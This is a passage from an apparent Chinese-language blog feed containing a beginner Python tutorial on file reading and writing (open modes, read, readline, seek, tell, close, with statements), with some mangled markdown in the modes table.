class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-文件系统</title>
    <url>/post/Python-FileContents/</url>
    <content><![CDATA[<p>Python是 文件对象.write()，PHP是fwrite() 😀…</p>
<a id="more"></a>

<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>文件系统</font> </center>

<p>推荐参考资料：<br><font color="#00B2EE">《<a href="http://www.runoob.com/python3/python3-inputoutput.html">Python3 输入和输出</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/sjie0224/articles/7562509.html">Python学习之路-11 (文件操作)</a>》</font> </p>
<br>

<br>

<h3 id="一-读写文件"><a href="#一-读写文件" class="headerlink" title="一. 读写文件"></a><font color="#FF6347" face="Comic sans MS">一. 读写文件</font></h3><p>Python提供了 input() 内置函数从标准输入读入一行文本，并将输入以字符串形式返回，默认的标准输入是键盘。</p>
<p>input 可以接收一个Python表达式作为输入，并将运算结果返回。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str = input(<span class="string">&quot;请输入：&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;你输入的内容是: &quot;</span>, str)</span><br><span class="line"></span><br><span class="line">这会产生如下的对应着输入的结果：</span><br><span class="line">请输入：菜鸟教程</span><br><span class="line">你输入的内容是:  菜鸟教程</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p><font color="#00B2EE"><strong>使用到的方法：</strong></font></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>open()：</strong></font> 以某种读写模式打开一个文件，将会返回一个 file 对象；</li>
<li><font color="#FF7F00"><strong>f.write(string) ：</strong></font> 将 string 写入到文件中, 然后返回写入的字符数；</li>
<li><font color="#FF7F00"><strong>f.read(size)：</strong></font> 将读取一定数目的数据, 然后作为字符串或字节对象返回；</li>
<li><font color="#FF7F00"><strong>f.readline() ：</strong></font> 从文件读取整行，包括 “\n” 字符。如果指定了一个非负数的参数，则返回指定大小的字节数，包括 “\n” 字符。；</li>
<li><font color="#FF7F00"><strong>f.readlines() ：</strong></font> 将返回该文件中包含的所有行；</li>
<li><font color="#FF7F00"><strong>f.tell() ：</strong></font> 返回文件对象当前所处的位置, 它是从文件开头开始算起的<strong>字节数</strong>；</li>
<li><font color="#FF7F00"><strong>f.seek() ：</strong></font> 如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数；</li>
<li><font color="#FF7F00"><strong>f.close() ：</strong></font> 当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，如果尝试再调用该文件，则会抛出异常。</li>
</ul>
<br>


<br>

<h4 id="1-1-open"><a href="#1-1-open" class="headerlink" title="1.1 open()"></a><font color="#3CB371" face="Comic sans MS">1.1 open()</font></h4><p>Python open() 方法用于打开一个文件，并<font color="#FF7F00"><strong>返回文件对象</strong></font>，在对文件进行处理过程都需要使用到这个函数，如果该文件无法被打开，会抛出 OSError。</p>
<p><strong>注意：</strong>使用 open() 方法一定要保证关闭文件对象，即调用 close() 方法。</p>
<p>open() 函数常用形式是接收两个参数：<strong>文件名(file)和模式(mode)**。即</strong><code>a = open(file, mode); </code>**</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">open(file, mode, buffering, encoding=None, <br>&emsp;&emsp;&emsp;errors=None, newline=None, <br>&emsp;&emsp;&emsp;closefd=True, opener=None)</td>
<td align="left">file: 必需，文件路径（相对或者绝对路径）。<br>mode: 可选，文件打开模式<br>buffering: 设置缓冲<br>encoding: 一般使用utf8<br>errors: 报错级别<br>newline: 区分换行符<br>closefd: 传入的file参数类型<br>opener:</td>
<td align="left">文件对象</td>
</tr>
</tbody></table>
<br>

<p><font color="#FF7F00"><strong>mode 参数有：</strong></font></p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">t</td>
<td align="left">文本模式 (默认)。</td>
</tr>
<tr>
<td align="left">x</td>
<td align="left">写模式，新建一个文件，如果该文件已存在则会报错。</td>
</tr>
<tr>
<td align="left">b</td>
<td align="left">二进制模式。</td>
</tr>
</tbody></table>
<ul>
<li>|打开一个文件进行<strong>更新(可读可写)**。<br>U    |通用换行模式（不推荐）。<br>r    |以</strong>只读方式<strong>打开文件。文件的指针将会放在</strong>文件的开头<strong>。这是默认模式。<br>rb    |以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。<br>一般用于非文本文件如图片等。<br>r+    |打开一个文件</strong>用于读写<strong>。文件指针将会放在文件的</strong>开头<strong>。<br>rb+    |以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。<br>w    |打开一个文件</strong>只用于写入<strong>。如果该文件已存在则打开文件，并从开头开始编辑，即</strong>原有内容会被删除<strong>。<br>如果该文件不存在，创建新文件。<br>wb    |以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有<br>内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>w+    |打开一个文件用于</strong>读写<strong>。如果该文件已存在则打开文件，并</strong>从开头开始编辑<strong>，</strong>即原有内容会被删除<strong>。<br>如果该文件不存在，创建新文件。<br>wb+    |以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，<br>即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。<br>a    |打开一个文件用于</strong>追加(不能读)<strong>。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>ab    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，<br>新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。<br>a+    |打开一个文件用于</strong>读写<strong>。如果该文件已存在，文件</strong>指针将会放在文件的结尾**。<br>文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。<br>ab+    |以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。<br>如果该文件不存在，创建新文件用于读写。</li>
</ul>
<br>

<p>下图很好的总结了这几种模式：</p>
<p><img data-src="https://i.loli.net/2019/03/06/5c7fb64577036.png" alt="2.png"></p>
<br>

<table>
<thead>
<tr>
<th align="center">模式</th>
<th align="center">读</th>
<th align="center">写</th>
<th align="center">创建</th>
<th align="center">覆盖</th>
<th align="center">指针在开始</th>
<th align="center">指针在结尾</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>r</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>r+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>w+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center"><strong>a</strong></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
<tr>
<td align="center"><strong>a+</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"><strong>✔</strong></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"><strong>✔</strong></td>
</tr>
</tbody></table>
<p><font color="#FF7F00"><strong>总结：</strong></font></p>
<ol>
<li>w 和 a 都是<font color="#FF7F00"><strong>写入不能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
<li>w+ 和 a+ 都是<font color="#FF7F00"><strong>写入且能读内容</strong></font>，前者是覆盖，后者是追加内容。</li>
</ol>
<br>

<p>以下实例将字符串写入到文件 foo.txt 中：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = open(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(f):</span><br><span class="line">	f.write( <span class="string">&quot;Python 是一个非常好的语言。\n是的，的确非常好!!\n&quot;</span> )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	print(<span class="string">&quot;文件打开失败&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">此时打开文件 foo.txt,显示如下：</span><br><span class="line">Python 是一个非常好的语言。</span><br><span class="line">是的，的确非常好!!</span><br></pre></td></tr></table></figure>


<blockquote>
<ol>
<li>第一个参数为要打开的文件名。</li>
<li>第二个参数描述文件如何使用的字符。 mode 可以是 <code>r</code> 如果文件只读, <code>w</code> 只用于写 (如果存在同名文件则将被删除), 和 <code>a</code> 用于追加文件内容; 所写的任何数据都会被自动增加到末尾. <code>r+</code> 同时用于读写。 mode 参数是可选的; <code>r</code> 将是默认值。</li>
</ol>
</blockquote>
<br>


<br>

<h4 id="1-2-f-write"><a href="#1-2-f-write" class="headerlink" title="1.2 f.write()"></a><font color="#3CB371" face="Comic sans MS">1.2 f.write()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.write(string)</td>
<td align="left">将 string 写入到文件中</td>
<td align="left">返回写入的字符数</td>
</tr>
</tbody></table>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = open(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line">print(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">14</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-3-f-read"><a href="#1-3-f-read" class="headerlink" title="1.3 f.read()"></a><font color="#3CB371" face="Comic sans MS">1.3 f.read()</font></h4><p>为了读取一个文件的内容，调用 <code>f.read(size)</code>, 这将读取一定数目的数据, 然后作为字符串或字节对象返回。</p>
<p>size 是一个可选的数字类型的参数。 当 size 被忽略了或者为负, 那么该文件的所有内容都将被读取并且返回。</p>
<p><strong>注意：</strong><font color="#FF7F00"><strong><code>f.read(size)</code>必须在<code>r</code>或者<code>r+</code>模式下来读取内容。</strong></font></p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.read(size)</td>
<td align="left">文件读取指定的字节数（读取的时候文件内容的<br>一个字符按一个字节来读），如果未给定或为负则读取所有</td>
<td align="left">字符串或字节对象返回</td>
</tr>
</tbody></table>
<br>


<p>以下实例假定文件 foo.txt 已存在（上面实例中已创建）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt文件内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = open(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">m = f.read(<span class="number">6</span>)</span><br><span class="line">print(m)</span><br><span class="line">print(isinstance(m,int))</span><br><span class="line">print(type(m) <span class="keyword">is</span> str)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="number">168456</span>      <span class="string">&#x27;&#x27;&#x27;把一个字符当作一个字节读取&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">False</span>       <span class="string">&#x27;&#x27;&#x27;isinstance(变量,类型)判断变量的类型&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="literal">True</span>        <span class="string">&#x27;&#x27;&#x27;type()...is 也可以判断类型&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-4-f-close"><a href="#1-4-f-close" class="headerlink" title="1.4 f.close()"></a><font color="#3CB371" face="Comic sans MS">1.4 f.close()</font></h4><p>在文本文件中 (那些打开文件的模式下没有 b 的), 只会相对于文件起始位置进行定位。</p>
<p>当你处理完一个文件后, 调用 f.close() 来关闭文件并释放系统的资源，<font color="#FF7F00"><strong>如果尝试再调用该文件，则会抛出异常</strong></font>。如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开一个文件</span></span><br><span class="line">f = open(<span class="string">&quot;g:/pythonst/foo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line">num = f.write( <span class="string">&quot;16845654316532&quot;</span> )</span><br><span class="line">print(num)</span><br><span class="line"><span class="comment"># 关闭打开的文件</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">print(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">14</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;3-7.py&quot;</span>, line <span class="number">8</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    print(f.read())</span><br><span class="line">ValueError: I/O operation on closed file.</span><br></pre></td></tr></table></figure>

<br>

<p>由于文件读写时都有可能产生IOError，一旦出错，后面的f.close()就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<font color="#FF7F00">**<code>try ... finally</code>**</font>来实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	f = open(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)  </span><br><span class="line">	m = f.read(<span class="number">6</span>)</span><br><span class="line">	print(m)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT： <span class="number">168456</span></span><br></pre></td></tr></table></figure>


<br>

<p>但是每次都这么写实在太繁琐，所以，Python引入了<font color="#FF7F00">**<code>with</code>语句搭配<code>as</code>**</font>来自动帮我们调用close()方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;foo.txt内容为16845654316532&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;g:/PythonSt/foo.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    print(f.read())</span><br><span class="line"></span><br><span class="line">OUTPUT： </span><br><span class="line"><span class="number">16845654316532</span></span><br></pre></td></tr></table></figure>



<br>


<br>

<h4 id="1-5-f-readline"><a href="#1-5-f-readline" class="headerlink" title="1.5 f.readline()"></a><font color="#3CB371" face="Comic sans MS">1.5 f.readline()</font></h4><br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readline(size)</td>
<td align="left">size为从文件中读取的字节数。<br>从文件读取整行，（包括 “\n” 字符。）</td>
<td align="left">size非负数则返回指定大小的字节数，<br>包括”\n”字符。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = open(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"></span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;读取第一行 %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line">line = fo.readline(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;读取的字符串为: %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取第一行 www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的字符串为: www.r</span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-6-f-readlines"><a href="#1-6-f-readlines" class="headerlink" title="1.6 f.readlines()"></a><font color="#3CB371" face="Comic sans MS">1.6 f.readlines()</font></h4><p>概述<br>readlines() 方法用于读取所有行(直到结束符 EOF)并返回列表，该列表可以由 Python 的 for… in … 结构进行处理。 如果碰到结束符 EOF 则返回空字符串。</p>
<p>如果碰到结束符 EOF 则返回空字符串。<br>关于EOF可参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/polar9527/article/details/38518703">文件结束符EOF</a>]</font> </p>
<br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readlines( )</td>
<td align="left">无参数</td>
<td align="left">返回列表，包含所有的行。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请自行区分下面两种输出方式：</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = open(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">print(fo.readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">[<span class="string">&quot;www.runoob.com&#x27;\\n&#x27;\n&quot;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>]</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">（<span class="number">2</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = open(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fo.readlines():                          <span class="comment">#依次读取每行  </span></span><br><span class="line">    line = line.strip()                             <span class="comment">#去掉每行头尾空白  </span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-7-f-tell"><a href="#1-7-f-tell" class="headerlink" title="1.7 f.tell()"></a><font color="#3CB371" face="Comic sans MS">1.7 f.tell()</font></h4><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.tell()</td>
<td align="left">无参数</td>
<td align="left">返回文件指针的当前位置（整数）</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = open(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取当前文件位置</span></span><br><span class="line">pos = fo.tell()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;当前位置: %d&quot;</span> % (pos))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">当前位置: <span class="number">20</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-8-f-seek"><a href="#1-8-f-seek" class="headerlink" title="1.8 f.seek()"></a><font color="#3CB371" face="Comic sans MS">1.8 f.seek()</font></h4><p>如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。</p>
<p>from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾。from_what 值为默认为0，即文件开头。例如：</p>
<p>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符<br>seek(x,1) ： 表示从当前位置往后移动x个字符<br>seek(-x,2)：表示从文件的结尾往前移动x个字符</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.seek(offset[, whence])</td>
<td align="left">offset： 开始的偏移量，也就是代表需要移动偏移的字节数，<br>如果是负数表示从倒数第几位开始。<br>whence：可选，默认值为 0。给 offset 定义一个参数，<br>表示要从哪个位置开始偏移；0 代表从文件开头开始算起，<br>1 代表从当前位置开始算起，2 代表从文件末尾算起。</td>
<td align="left">无返回值</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = open(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重新设置文件读取指针到开头</span></span><br><span class="line">fo.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-9-file-对象的方法"><a href="#1-9-file-对象的方法" class="headerlink" title="1.9 file 对象的方法"></a><font color="#3CB371" face="Comic sans MS">1.9 file 对象的方法</font></h4><br>

<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.close()</a></font><br>关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.flush()</a></font> <br>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件,<br>而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.fileno()</a></font> <br>返回一个整型的文件描述符(file descriptor FD 整型), <br>可以用在如os模块的read方法等一些底层操作上。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.isatty()</a></font><br>如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.next()</a></font> <br>返回文件下一行。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.read([size])</a></font> <br>从文件读取指定的字节数，如果未给定或为负则读取所有。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readline([size])</a></font> <br>读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readlines([sizeint])</a></font><br> 读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, <br>实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.seek(offset[, whence])</a></font> <br>设置文件当前位置</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.tell()</a></font> <br>返回文件当前位置。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.truncate([size])</a></font> <br>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；<br>截断之后后面的所有字符被删除，其中 Widnows 系统下的换行代表2个字符大小。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.write(str)</a></font> <br>将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.writelines(sequence)</a></font> <br>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="二-在内存读写"><a href="#二-在内存读写" class="headerlink" title="二. 在内存读写"></a><font color="#FF6347" face="Comic sans MS">二. 在内存读写</font></h3><p>可参考：<br><font color="#00B2EE">[<a href="https://blog.51cto.com/limingyu/2320441?source=dra">StringIO和BytesIO</a>]</font><br><font color="#00B2EE">[<a href="https://www.jianshu.com/p/b74a83e0f9fc">Python文件读写、StringIO和BytesIO</a>]</font></p>
<br>

<p>IO在计算机中指Input/Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。</p>
